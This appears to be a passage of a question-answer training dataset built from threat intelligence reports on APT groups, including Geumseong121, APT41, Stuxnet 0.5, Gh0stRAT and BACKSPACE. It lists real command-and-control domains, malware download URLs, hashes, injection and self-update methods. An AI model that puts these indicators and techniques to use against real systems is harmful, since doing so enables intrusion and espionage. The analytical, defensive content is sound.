GPK1.DTL.\nDelio, Michelle. 2001. Code Blue Targets China Firm. Retrieved on February 10, 2008, from .\nDelio, Michelle. 2001. It's Cyber War: China vs. US. Retrieved on July 2, 2008, from .\nDerene, Glenn. 2008. Inside NSA Red Team Secret Ops with Government's Top Hackers. Retrieved on August 10, 2008, from military_law/4270420.html.\nDick, Stevens J. 2006. The Importance of Exploration. Retrieved on March 3, 2008, from .\nDoS Attacks on Estonia Were Launched by Student. Retrieved on March 8, 2008, from .\nEconomy, Elizabeth C. And Segal, Adam. 2008. China's Olympic Nightmare. Retrieved on June 30, 2008, from\nc-economy-adam-segal/china-s-olympic-nightmare.html.\nEspiner, Tom. 2006. Academics break the Great Firewall of China. Retrieved on July 4, 2008, from subj=news.\nEspiner, Tom. 2005. Security Experts Lift Lid On Chinese Hack Attacks. Retrieved on February 9, 2008, from .\nEstonia Fines Man for Cyber War. 2008. Retrieved on February 12, 2008, from .\nEstonia Has No Evidence of Kremlin Involvement. 2007. Retrieved on March 10, 2008, from .\nEstonia Hit by Moscow Cyber War. 2007. Retrieved on January 23, 2008, from .\nEverett, Margaret. Latin America On-line: The Internet, Development, and Democratization. 1998. Retrieved on March 2, 2008, from / everett.html.\nFaiola, Anthony. 2005. Anti-Japanese Hostilities Move to the Internet. Retrieved on June 8, 2008, from AR2005050901119.html.\nFCS Watch. Retrieved on March 10, 2008, from fcs_watch.html.\nFrench, Howard W. 2006. Chinese Tech Buffs Slake Thirst for U.S. TV Shows. Retrieved on August 4, 2008, from china.html/partner/rssnyt?_r=2&oref=slogin.\nFriedman, Elisabeth Jay. 2005. The Reality of Virtual Reality. Retrieved February 22, 2008, from .\nFuel Demo Adds to Road Taxes Row. 2008. Retrieved on August 1, 2008, from .\nFuture Combat Systems. 2008. Retrieved on March 10, 2008, from r ity.org/military/systems/ground/fcs.htm.\nGannon, John C. 2001. The National Security Telecommunications and Information Systems Security Committee. Retrieved on February 12, 2008, from / speeches_telecommunications.html.\nGeneral Staff Department. 1997. Retrieved on March 20, 2008, from .\nGOA. 1996. Information Security: Computer Attacks at Department of Defense Pose Increasing Risks. Retrieved on February 5, 2008, from 96084.htm.\nGoodin, Dan. 2008. India and Belgium Decry Chinese Cyber Attacks. Retrieved on June 10, 2008, from /.\nGoogle censors itself for China. 2006. Retrieved on July 22, 2006, from . uk/2/hi/technology/4645596.stm.\nGraham, Bradley. 2005. Hackers Attack Via Chinese Websites. Retrieved on January 8, 2008, from 24/AR2005082402318.html.\nGreenberg, Andy. 2007. Apples For The Army. Retrieved on January 20, 2008, from ity-cx_ag_1221army.html.\nGreenberg, Andy. 2007. Worst Cybersecurity Meltdowns. Retrieved on February 18, 2008, from 1026worsthacks.html.\nGreenemeier, Larry. 2007. China's Cyber Attacks Signal New Battlefield Is Online. Retrieved on July 7, 2008, from cyber-attacks-sign.\nGrier, Peter. 2005. Spy Case Patterns The Chinese Style of Espionage. Retrieved on March 23, 2008, from .\nGriggs, Brandon. 2008. US at risk of Cyberattacks, Experts Say. Retrived on August 25, 2008, from .\nHacker Attacks in US Linked to Chinese Military. 2005. Retrieved on July 21, 2006, from .\nHacking Textfiles. 2008. Retrieved on June 8, 2008, from .\nHacking US Government Computers from Overseas. 2001. Retrieved on February 2, 2008, from .\n\nQuestion: How does the article 'China's Space Program Aims at Peaceful Use of Space Resources' contrast with concerns about China's cyber warfare intentions?\n\nAnswer:",
    "output": "The article 'China's Space Program Aims at Peaceful Use of Space Resources' presents China's official stance on its space program, emphasizing peaceful and scientific purposes. However, this narrative contrasts with concerns raised by various reports and analyses that suggest China's space and cyber capabilities could be used for military and offensive purposes, including cyber warfare. Understanding this contrast helps in evaluating China's strategic intentions and the potential dual-use nature of its technological advancements.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: Correlation Analysis\n\u25a0 Similar Threat Case\nThe spear phishing using the same technique has been identified in September 2017. The HWP vulnerability was also used for the attack, and the metadata is identical to the IOC of the attack on August 2018.\nThe attacker's account name and the OLE code are disguised as references and reply to the original message.\n[Figure 6] E-mail used in the attack\nThe file name 'icloud.exe' is used for the malicious program and the following PDB (Program Data Base) code is inside.\n- E:\\))PROG\\doc_exe\\Release\\down_doc.pdb\nThe PDB series is diverse depending on the variant malicious files, and it is also related to the 2013 versions using the AOL messenger (AIM).\nAOL Messenger was used for communicating in the early days before the infected Korean websites were used as a\ncommunication method. After that, it has evolved to use the Streamnation.com for Command and Control.\nThe emails from Korea, USA, China, India and Russia can be used for subscribing the account for C2 Communication.\nThe cloud services such as pcloud.com, yandex.com and Dropbox have been used before and a real-time networking platform PubNub service is currently used. The PubNub is infrastructure-as-a-service (IaaS) to provide the service to interconnect IoT cloud devices as one system.\n- K:\\))pick\\ie\\test.pdb\n- D:\\))pick\\doc_exe\\Release\\down_doc.pdb\n- E:\\))PROG\\doc_exe\\Release\\down_doc.pdb\n- E:\\))PROG\\doc_exe\\Release\\drun.pdb\n- E:\\))PROG\\ie\\Release\\drun.pdb\n- E:\\))PROG\\Upload\\Upload\\thunder\n- E:\\))PROG\\waoki\\Release\\runner.pdb\n- E:\\))PROG\\waoki\\Release\\kltest.pdb\nThe command control (C2) server of the attack is the 'endlesspaws.com' domain, which has been previously used for similar attacks several times.\nIn terms of Threat Intelligence (TI), the identified server is useful to investigate similar threats carried out by the same attackers.\nESRC also confirmed that the domain has connections to \"Watering Hole attack related to North Korea\", which is discovered in South Korea in 2015, and gained the evidence that it is exploited in the spear phishing attack with attached executable file in 2017.\nThe attack exploiting the CVE-2017-8759 vulnerability has been detected as well. Some of them have been posted on the by .\n\u25a0 Deep Analysis on Correlation\nA number of similar threat appeared in February of 2017. The domain endlesspaws.com was leveraged to distribute the malware by luring the users with the safety guideline for strengthening the protection of North Korean defectors.\n[Figure 8] Distributing the malware by disguising as the safety guideline\nIt looks like it attaches a 'safety tips .zip' file to an email, but it actually is linked to the 'endlesspaws.com' domain to install a compressed file, and it contains malicious EXE executable files with a double extension disguised as an HWP document.\nIt masquerades as a double extension, and the icon is disguised as a normal HWP file by utilizing the document file resource.\nThe malicious file loads the code that is configured of the cryptographic function routines inside, and decodes certain hexadecimal codes into a logical XOR 0x55 key value.\nEXE executable malicious files will attempt to connect to the following addresses, same as the C2 domain used to distribute ZIP compressed files:\n- http://endlesspaws.com/vog/tan[.]php?fuck=x\n- http://endlesspaws.com/vog/denk[.]zip\n[Figure 9] Code for converting the encrypted C2 data\nThe additionally downloaded 'denk.zip' file, which appears to be a seemingly zip compressed file, is actually a HWP format document file.\nThe malware distributed in EXE format contains the normal HWP document inside. It shows users the normal document in the process of infecting the device or it can download the normal HWP document from the C2 server. However, this case is different from the common type of the malware. It downloads and install additional malicious HWP documents.\nThis is an unusual case of installing the additional document-based malicious files on the already infected system. As the document file contains content that matches the email content used in the attack, it is not likely that the file is improperly linked due to confusion with other cyber operations.\nThe malicious script code is injected in the DefaultJScript area in the 'denk.zip' file. The malicious DLL file encoded in BASE64 code in the embedded format will be decoded when the script runs.\n[Figure 10] The malicious script code included in the document file\nThe malicious DLL file that is decoded by BASE64 code contains the following PDB path, and connect to the six Korean command control (C2) servers.\nThe code 'srvrlyscss', which has been detected in many IOCs in Korea, is used for communication.\n[Figure 11] Code with 'srvrlyscss' string for communication\n- seline.co.kr/datafiles/CNOOC[.]php\n- www.causwc.or.kr/board_community01/board_community01/index2[.]php\n- www.kumdo.org/admin/noti/files/iindex[.]php\n- www.icare.or.kr/upload/board/index1[.]php\n- cnjob.co.kr/data/blog/iindex[.]php\n- notac.co.kr/admin/case/iindex[.]php\nThe string 'taihaole9366' was used as the mutex code to prevent Duplicate Execution. .\nThe attacker has used the English expression of Chinese very often from the past, and there are a lot of other expressions.\n[Figure 12] Encoded C2 and Mutex in English expression of Chinese\nThe malware disguised as a popular Chinese security program has been identified in January of 2018. It is a different case from the one disguising as an existing Korean security program.\nThe attacker added a fake screen to the Korean website 'ebsmpi.com' as if it were a 360 TOTAL SECURITY security program web page in China.\nIt copied the source code of the website operated in China and replaced the downloaded file with the malicious files.\nThe linked addresses are as follows, and when clicking the 'Free Download' link, the file '360TS_Setup_Mini.exe' is downloaded.\n- http://ebsmpi.com/ipin/360/down[.]php\nIt disguises the file name (360TS_Setup_Mini.exe) like the security program in China, and the icon also camouflages\nthe normal program. The additional .Net-based malicious file is installed depending no environmental conditions.\nESRC identified in August 2018 that the encryption algorithm is 100% identical to the vector technique of the attack disguising as the Korean portal program\n[Figure 14] Comparison of malicious files disguised as a Chinese security program and normal file\n- http://ebsmpi.com/ipin/360/Ant_3.5[.]exe (MD5 : ff32383f207b6cdd8ab6cbcba26b1430) - http://ebsmpi.com/ipin/360/Ant_4.5[.]exe (MD5 : 84cbbb8cdad90fba8b964297dd5c648a) - http://cgalim.com/admin/hr/temp[.]set (MD5 : fa39b3b422dc4232ef24e3f27fa8d69e)\n- http://ebsmpi.com/ipin/360/desktops[.]ini (MD5 : ab2a4537c9d6761b36ae8935d1e5ed8a)\nThe normal '360TS_Setup_Mini.exe' file is installed in the domain 'cgalim.com' with the file name 'temp.set', which is also used for a similar infringement attack discovered in Second half of the year.\n[Figure 14-1] '360TS_Setup_Mini.exe' installing the normal file\nInitial malicious files based on .Net include the following PDB paths, some of which are omitted from the latest variants.\n- E:\\project\\windows\\Rocket\\Ant\\Api\\PubnubApi\\obj\\Debug\\net35\\Pubnub.pdb\n- E:\\project\\windows\\Rocket\\Sys-Guard\\Servlet-standalone_Guard\\Release\\Servlet.pdb\n- E:\\project\\windows\\Rocket\\Sys-Guard\\Chutty_Guard\\Release\\Chutty.pdb\n- E:\\project\\windows\\Rocket\\Servlet\\Release\\Servlet.pdb\n- E:\\project\\windows\\Rocket\\Ant_4.5\\Ant\\obj\\Release\\Ant.pdb\nESRC has verified that when executing the malicious file, they download the normal programs from another infected server to trick users believing into the normal program is running.\nThe C2 server overlaps with the hosts, which are detected from the distribution of Android malicious application (1.apk) and the bitcoin related 'bitcoin-trans.doc' (MD5: 8ab2819e42a1556ba81be914d6c3021f) malicious file.\n- http://cgalim.com/admin/hr/hr[.]doc (MD5 : 24fe3fb56a61aad6d28ccc58f283017c)\n- http://cgalim.com/admin/hr/1[.]apk (MD5 : 9525c314ecbee7818ba9a819edb4a885)\n- http://cgalim.com/admin/hr/temp[.]set (MD5 : fa39b3b422dc4232ef24e3f27fa8d69e)\nThe domain 'cgalim.com' left traces that show the variant file is distributed in /1211me/ as well as the subpath /hr/.\nThe group conducted a watering hole attack against North Korean organizations in 2015 and 2016. The attackers were actively exploiting flash player vulnerabilities for the attack.\nNorth Korea-related news sites and web sites have been mainly targeted by the threat, and lasts for several months.\nThe following is a malicious object added to the infected website.\nThe hacking group exploited the latest Flash player vulnerabilities CVE-2015-5119 and CVE-2015-0313 in 2015, and Flash Player CVE-2015-5119 vulnerability leaked from the server hacking attack performed by Italian Hacking Team.\nThe group has used KakaoTalk Messenger to selectively target victims and carried out the attack exploiting the CVE-2018-4878 Flash Player Zero-day vulnerability since late 2017.\n- G:\\FlashDeveloping\\mstest\\src (CVE-2014-8439)\n- G:\\FlashDeveloping\\20148439\\src (CVE-2014-8439)\n- G:\\FlashDeveloping\\Main\\src\\ (CVE-2015-0313)\n- G:\\FlashDeveloping\\2015-3090\\src (CVE-2015-3090)\n- G:\\FlashDeveloping\\20153105\\src (CVE-2015-3105)\n- G:\\FlashDeveloping\\20155119\\src (CVE-2015-5119)\n- G:\\FlashDeveloping\\chrome_ie\\src (CVE-2015-5119)\nIn case that the additional malware downloaded by the Flash Player Vulnerability (SWF) fails to execute administrator privileges via User Account Control, a fake error message of hard disk pops up after about 5 minutes.\nIt manipulates as backup process and re-execute the malware with administrator privilege CMD command. Some Korean expressions observed were identical to the English computer expression (prose, program) used in North Korea.\nThe C2 communication method has evolved over the years. In the earliest days, America Online Instant Messenger (AIM) Oscar protocol was used for Command and Control.\n\nQuestion: How has the command and control (C2) communication method of the Geumseong121 group evolved over time, and what specific techniques have they employed?\n\nAnswer:",
    "output": "The Geumseong121 group's C2 communication methods have evolved significantly over time. Initially, they used America Online Instant Messenger (AIM) Oscar protocol for Command and Control. Later, they transitioned to using infected Korean websites as a communication method. More recently, they have employed cloud services like pcloud.com, yandex.com, and Dropbox, as well as real-time networking platforms like PubNub, which is an infrastructure-as-a-service (IaaS) to interconnect IoT cloud devices. The group has also leveraged domains such as 'endlesspaws.com' and 'cgalim.com' for C2 communication, connecting to multiple Korean C2 servers using strings like 'srvrlyscss' for communication.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What techniques does the LURK0 variant of Gh0stRAT use to execute its payload, and how can these techniques be identified in a compromised system?",
    "output": "The LURK0 variant of Gh0stRAT executes its payload by launching a hidden instance of Internet Explorer and injecting malicious code into this instance using WriteMemory and CreateRemoteThread process injections. This can be identified by looking for memory writes and remote thread creations in processes like 'iexplore.exe'. For example, the log entries 'WRITE_MEMORY @ 0x00140000 [0x0000005c bytes] [PID: 1076] [C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe]' and 'CREATE_REMOTE_THREAD @ 0x7c80aedb [PID: 1076] [C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe]' indicate such activity. Additionally, the creation of folders like 'AppData\\\\Roaming\\\\Micbt' by the malware is another indicator of its presence.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Evolution\nStuxnet 0.5 was submitted to a malware scanning service in Version November 2007 and could have 0.500 began operation as early as November 2005. This version is 0.500 designed to stop compromising 0.500 computers on July 4, 2009, and 1.001 stop communicating with its 1.100 command-and-control (C&C) servers on an earlier date of 1.101 January 11 that same year. The 1.x compile timestamps found within most of the code appear unreliable and generally are in the range of the year 2001.\nBased on an internal version number this version of Stuxnet is 0.5, the earliest known version of the Stuxnet family.\nThe only method of replication in Stuxnet 0.5 is through infection of Siemens Step 7 project files. Stuxnet 0.5 does not exploit any Microsoft vulnerabilities, unlike versions 1.x which came later.\nThere are differences in exploited vulnerabilities and spreading mechanisms between Stuxnet versions.\nStuxnet 0.5 is partly based on the Flamer platform whereas 1.x versions were based primarily on the Tilded platform. Over time, the developers appear to have migrated more towards the Tilded platform. The developers actually re-implemented Flamer-platform components using the Tilded platform in later versions.\nBoth the Flamer and Tilded platform code bases are different enough to suggest different developers were involved.\nStuxnet 0.5 also contains code to attack the valve systems in a uranium enrichment facility rather than modifying centrifuge speeds, as in versions 1.x of Stuxnet.\nBig Headline: Installation and load point\nStuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files. Using the (<http://www.securityfocus.com/bid/54651>)Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability (CVE-2012-3015), the S7hkimdb.dll file is executed, which then decrypts and injects the main XR00001.MDX Stuxnet binary file into the services.exe process. Stuxnet is now executing on the system.\nOnce injected into the services.exe process, a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver.  The main Stuxnet binary refers to itself as outbreak.dll and is saved to disk as oem7a.pnf.  The companion DLL that implements the payload refers to itself as installation.dll and saved to disk as oem7w.pnf.  When the system is booted, the MRXCLS.SYS load point driver will decrypt configuration data stored in the registry, decrypt the main Stuxnet binary, and inject it into the Explorer and Step 7 processes. The payload DLL will be decrypted as well and injected into the Explorer process. When loading dynamic-link library (DLL) resources, Stuxnet makes use of a module that mimics LoadLibrary rather than calling LoadLibrary itself. This technique is likely used to avoid security software and was not seen in versions 1.x of Stuxnet.\nA second driver, PCIBUS.SYS, is also created which causes a forced reboot by generating a BSoD (Blue Screen of Death) 20 days after installation.\nA third driver, USBACC11.SYS, is then installed. This driver is similar to the MRXCLS.SYS driver, but instead decrypts and injects DLLs for peer-to-peer and C&C communication into the svchost.exe and Internet Explorer processes.\nThe structure and organization as well as resource and export listings of each component is available in Appendix D.\nStuxnet 0.5 also checks the current date in a variety of code paths and will not continue to spread after July 4, 2009. Certain modules may also not be created or loaded if security software is present. A list is available in Appendix B.\nA variety of additional files are created, including log files and configuration files. A list is available in Appendix A.\nBig Headline: Replication\nStuxnet 0.5 uses one form of replication through Step 7 project archives. When a removable drive is inserted in an infected system, Stuxnet 0.5 will infect any Step 7 project archives with a .s7p or .zip file name extension on the drive. In addition, Step 7 project archives on the local disk will also be infected.\nTherefore Stuxnet 0.5 spreads to additional machines through removable drives or through human-initiated sharing of infected Step 7 project archives, for example through email.\nStuxnet 0.5 infects Step 7 project archives in the same manner as Stuxnet 1.x versions (as described in (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)W32.\nApiLog/Types \u2013 modified to trigger DLL loading vulnerability\nXUTILS/links/S7P00001.DBF \u2013 configuration file XUTILS/listen/S7000001.MDX \u2013 payload DLL (installation.dll)\nXUTILS/listen/XR000000.MDX \u2013 main Stuxnet binary (outbreak.dll) hOmSave7/subfolder/s7hkimdb.dll - loader\nBig Headline: Command-and-control\nSimilar to Stuxnet 1.x versions, Stuxnet 0.5 has limited command-and-control ability. In particular, Stuxnet 0.5 does not provide fine grained control to its authors. Instead, Stuxnet 0.5 can only download new code and update itself. Stuxnet needs to ultimately spread on isolated networks with no Internet access, therefore it has been designed to be autonomous to reduce the need for robust and fine grained command-and-control. Stuxnet 0.5 also uses a secondary peer-to-peer mechanism to propagate these code updates to peers on networks inaccessible to the broader Internet.\nCommand-and-control is implemented by the inetpsp.dll file while peer-to-peer communications are implemented by the netsimp32.dll file. Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes.\nStuxnet 0.5 has four C&C servers, all of which are now either unavailable or have since been registered by an unrelated party:\n\u2022 smartclick.org\n\u2022 best-advertising.net\n\u2022 internetadvertising4u.com\n\u2022 ad-marketing.net\nInterestingly, Stuxnet 0.5 is programmed to stop contacting the C&C server after January 11, 2009, even though the threat is programmed to only stop spreading after a later date of July 4, 2009.\nThe C&C server domains were created in 2005 and all displayed the same front page purporting to be an Internet advertising agency named Media Suffix (figure 1) with the tag line \"Believe What the Mind Can Dream\".\nThe servers were hosted on commercial hosting providers in the United States, Canada, France, and Thailand. The fact that these domains were in operation since 2005, suggests that the Stuxnet project started more than seven years ago.\nFigure 1\nInternet advertising agency homepage for Stuxnet C&C servers\nThe first request by Stuxnet 0.5 uses the following form:\nhttp://<domain>/cgi/link.php?site=xx\nThis notifies the C&C server of an active successful infection. Next, Stuxnet 0.5 sends the following request: http://<domain>/cgi/click.php?xite=xx&num=yy&c=1&j=%x&k=%x&l=%x\nThis may download and execute a file if an update is available.\nThe final target network for Stuxnet 0.5 was likely isolated from the Internet. To allow updates to reach these machines, Stuxnet 0.5 also used a peer-to-peer mechanism. As long as one updated version was introduced into this network\u2014for example through an infected USB key\u2014all the other infected machines on the network could receive updates or new code modules.\nStuxnet 0.5 uses Windows mailslots for peer-to-peer communication. Mailslots allow a process to pass a message to another process on a remote machine. Stuxnet 0.5 enumerates all machines on the network and attempts to connect to a mailslot named \\\\[REMOTE MACHINE NAME]\\mailslot\\svchost. It then provides a callback mailslot name of \\\\[LOCAL MACHINE NAME]\\mailslot\\imnotify.\nStuxnet 0.5 uses these mailslots for peer-to-peer communication and to pass code updates. In addition, Stuxnet 0.5 may configure systems to allow anonymous logins and then provides the following file shares:\n\u2022 temp$\n\u2022 msagent$\n\u2022 SYSADMIN$\n\u2022 WebFiles$\nThis allows file retrieval by peer infections. Shared files include:\n%WinDir%\\msagent\\agentsb.dll\n%WinDir%\\msagent\\intl\\agt0f2e.dll\n%WinDir%\\system32\\complnd.dll\n%WinDir%\\system32\\dllcache\\datacprs.dll\n%WinDir%\\system32\\wbem\\perfnws.dll\n%WinDir%\\Installer\\{6F716D8C-398F-11D3-85E1-005004838609}\\places.dat\nMedium Headline: Man-in-the-Middle\nIn order to both fingerprint the target system and inject malicious Programmable Logic Controller (PLC) code, Stuxnet 0.5 replaces two Step 7 DLLs in order to hijack communications with a PLC.\nThe first DLL, s7otbxdx.dll, is hijacked in order to insert the malicious PLC code. The same technique was used in Stuxnet versions 1.x (as described in (<http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf>)W32.Stuxnet Dossier, Modifying PLCs). Stuxnet 0.5 hooks fewer exports and verifies the CPU is a 417 PLC rather than a 315 PLC, otherwise the behavior remains generally the same.\nThe second DLL, s7aaapix.dll, is used for fingerprinting the target system and building DB8061, a PLC data block needed to conduct the attack. The export AUTDoVerb is hijacked and the malicious s7otbxdx.dll file can call the export with magic values (0x91E55A3D, 0x996AB716, 0x4A5CBB03) in order to build or provide a previously built DB8061 data block for injection. Stuxnet hijacks AUTDoVerb in order to monitor any \"DOWNLOAD\" verb actions, which signifies the fingerprinting and building of DB8061 must occur again in order to ensure the target system is still correctly configured.\n\nWhat specific techniques does Stuxnet 0.5 use to hijack communications with a Programmable Logic Controller (PLC), and how does it ensure the target system is correctly configured for the attack?",
    "output": "Stuxnet 0.5 hijacks communications with a PLC by replacing two Step 7 DLLs. The first DLL, s7otbxdx.dll, is hijacked to insert the malicious PLC code. The second DLL, s7aaapix.dll, is used for fingerprinting the target system and building DB8061, a PLC data block needed to conduct the attack. Stuxnet 0.5 hooks fewer exports and verifies the CPU is a 417 PLC rather than a 315 PLC. It hijacks the AUTDoVerb export to monitor 'DOWNLOAD' verb actions, ensuring the target system is still correctly configured for the attack. This technique ensures that the malicious code is only injected into the appropriate PLC environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does cloud computing present unique security challenges, and what are some of the key technical issues identified in the literature?",
    "output": "Cloud computing presents unique security challenges due to its distributed nature and shared resources. Key technical issues identified in the literature include data security, privacy concerns, and the potential for unauthorized access. Armbrust et al. discuss the various aspects of cloud computing, while Jensen et al. highlight technical security issues such as data breaches, account hijacking, and insufficient due diligence. Mansfield-Devine also points out the dangers associated with cloud computing, emphasizing the need for robust security measures to protect sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nFireEye Threat Intelligence assesses with high confidence that APT41 is a Chinese state-sponsored espionage group that is also conducting financially motivated activity for personal gain.\nAPT41 espionage operations against the healthcare, high-tech, and telecommunications sectors include establishing and maintaining strategic access, and through mid-2015, the theft of intellectual property.\nThe group's operations against higher education, travel services, and news/media firms provide some indication that the group also tracks individuals and conducts surveillance.\nFireEye Threat Intelligence assesses with high confidence that APT41 carries out an array of financially motivated intrusions, particularly against the video game industry, including stealing source code and digital certificates, virtual currency manipulation, and attempting to deploy ransomware.\nAPT41 has executed multiple software supply chain compromises, gaining access to software companies to inject malicious code into legitimate files before distributing updates.\nBig Headline: Targeting\nLike other Chinese espionage operators, APT41 targets industries in a manner generally aligned with China's Five-Year economic development plans. However, some campaigns attributed to APT41 indicate that the group is also deployed to gather intelligence ahead of imminent events, such as mergers and acquisitions (M&A) and political events. Directly targeted verticals include:\n\u2022 Healthcare: including medical devices and diagnostics\n\u2022 High-tech: including semiconductors, advanced computer hardware, battery technology, and electric vehicles\n\u2022 Media: including news organizations\n\u2022 Pharmaceuticals\n\u2022 Retail\n\u2022 Software companies: which were compromised in supply chain operations potentially affecting large numbers of victims\n\u2022 Telecoms\n\u2022 Travel services\n\u2022 Education\n\u2022 Video games: including development studios, distributors/publishers, and activities enabling supply chain compromises\n\u2022 Virtual currencies: including in-game currencies, cryptocurrencies, and related services\nAPT41 has targeted organizations in 14 countries (and Hong Kong) over seven years, including: France, India, Italy, Japan, Myanmar, the Netherlands, Singapore, South Korea, South Africa, Switzerland, Thailand, Turkey, the United Kingdom, and the United States (Figure 1). APT41 espionage operations against entities in these countries follow targeting of verticals consistent with Chinese national policy priorities.\nCountries and industries targeted directly by APT41.\nBig Headline: Operations Over Time\nThe duality of APT41's state-sponsored activity and its own cyber crime operations is demonstrated in the group's simultaneous operations. Throughout the group's observable history, APT41 has consistently run its own financially motivated campaigns concurrently with espionage operations. In contrast, APT41 espionage targeting has changed significantly over time, suggesting shifts in assigned missions or new contracts to complete. A breakdown of industries targeted by APT41 over time can be found in Figure 2.\n\u2022 We believe that like other Chinese espionage operators, APT41 has moved toward strategic intelligence collection and establishing access, but away from direct intellectual property theft. This shift, however, has not affected the group's consistent interest in targeting the video game industry for financially motivated reasons.\n\u2013 We have not observed evidence of IP theft since late 2015.\n\u2013 In 2014, APT41 was observed carrying out espionage campaigns concurrently with financially motivated intrusions, demonstrating that they could balance different objectives simultaneously.\n\u2022 Espionage operations occurred while the group was still carrying out financially motivated campaigns, including longer-term intrusions, which typically extended for more than a year.\n\u2013 In one instance, APT41 was attempting to steal data from a healthcare target while also attempting to deploy ransomware at a video game studio.\n\u2022 Compromising organizations in different sectors concurrently provides some indication that they are fulfilling specific assigned tasks.\n\u2013 Campaigns have expanded into additional industries including telecoms, the automotive sector, higher education, and travel services.\n\u2013 In 2015, we observed a time period in which eight organizations in six different industries were compromised simultaneously.\n\u2022 Since 2017, APT41's activities have included a series of supply chain compromises. The operation injects malware into legitimate server software packages used by hundreds of companies worldwide but limits deployment of additional payloads to select targets.\n\nQuestion: How does APT41 balance its state-sponsored espionage activities with its financially motivated operations? Provide examples of how this duality is demonstrated in their operations.\n\nAnswer:",
    "output": "APT41 balances its state-sponsored espionage activities with financially motivated operations by running both types of campaigns concurrently. For example, in 2014, APT41 was observed carrying out espionage campaigns while also conducting financially motivated intrusions. One notable instance involved the group attempting to steal data from a healthcare target while simultaneously trying to deploy ransomware at a video game studio. This duality is further highlighted by their consistent targeting of the video game industry for financial gain, even as their espionage targeting shifted towards strategic intelligence collection and away from direct intellectual property theft after 2015.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Download Additional Files\nBACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/app. txt and saves the file to the path <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordPlug.exe. If the downloaded file is a valid PE file, start a new process.\nNext, BACKSPACE sends an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/ hostlist.txt. If the victim computer's hostname is found in the response, BACKSPACE sends a new HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/myapp.txt and saves the file to the path <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordForVista.exe. If the downloaded file is a valid PE file, start a new process.\nBACKSPACE then deletes the following files:\n\u2022 <CSIDL_PROFILE>\\Microsoft Office\\BIN\\Temp.txt\n\u2022 <CSIDL_PROFILE>\\Microsoft Office\\BIN\\UpdateWord.exe\n\u2022 <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordPlug.exe\n\u2022 <CSIDL_PROFILE>\\Microsoft Office\\BIN\\WordForVista.exe\nMedium Headline: Self-Update Mechanism\nBACKSPACE uses version control and will attempt to verify the current version and perform a self-update as follows:\n1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain (www.bigfixtools[.]com or www.km153[.]com) and URL path /ForZRLnk3z/ver.txt; if the version returned does not match the version of the current binary ( \"1.9.w.lY\" for this sample), go to step 2\n2. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/exe.txt and saving the file to <CSIDL_PROFILE>\\Microsoft Office\\BIN\\ UpdateWord.exe.\n3. If <CSIDL_PROFILE>\\Microsoft Office\\BIN\\UpdateWord.exe is a valid PE, start a new process.\nIf the previous update task fails, BACKSPACE performs a secondary update task:\n1. Obtain the latest available version number by making an HTTP to request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpVer.txt; if the version returned does not match the version of the current binary, go to step 2.\n2. Make an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpList.txt and validate that the victim computer's hostname is in the response; if true, go to step 3.\n3. Download a new binary by making an HTTP request to the primary C2 URL domain and URL path /ForZRLnk3z/SomeUpExe.txt and saving the file to <CSIDL_PROFILE>\\Microsoft Office\\BIN\\ UpdateWord.exe.\n4. If <CSIDL_PROFILE>\\Microsoft Office\\BIN\\UpdateWord.exe is a valid PE, start a new process.\nBACKSPACE uses the same mutex (MicrosoftZjZRLnk), and event names (MicrosoftZjZRLnkExit, MicrosoftZjZRLnkHaveExit) across different versions of the same variant. Thus, the malware can remove the previous version and update to a newer version while ensuring that only one instance of the same backdoor family is installed on a given host.\nWhen the malware is updated, the randomly generated hostid from the initial infection (stored in the registry) is not changed. From the attacker's perspective, this allows the \"identity\" of the victim host to remain consistent, even across multiple version updates.\nMedium Headline: Second Stage C2 Server\nNext, BACKSPACE makes an HTTP request to the primary C2 URL domain (www.bigfixtools[.]com or www.km153[.]com) and URL path /ForZRLnk3z/dizhi.gif.  Dizhi.gif is a 10-byte configuration file that specifies an IP address and two port numbers.\nBACKSPACE starts a new thread to send details about the victim computer (ComputerName, IP, SystemDetails, DefaultLangID, HostID, Proxy info, malware current version, malware current domain, and information about the logical drives) to Port1 on the new C2 server. The malware will use the victim computer's saved proxy settings if needed. The data is sent using an HTTP POST request with the following structure:\nTable 10:  BACKSPACE \"ZRLnk\" callback structure\nA sample beacon is shown below. Note that the HTTP User-Agent header is set to the non-standard value \"SJZJ (compatible; MSIE 6.0; Win32)\".\nBACKSPACE also attempts to retrieve the URL path /ForZRLnk3z/connect.gif from the primary C2 URL domain. If the victim computer's hostname and hostid are found in the file, the victim will attempt to establish a connection to the second stage C2 server on Port2 to allow the threat actors to directly interact with the victim via the BACKSPACE controller.35  After establishing the connection to the controller, BACKSPACE awaits further interactive commands from the operator. For this copy of BACKSPACE, the following commands are supported:\nTable 11: Commands supported by BACKSPACE \"ZRLnk\" variant 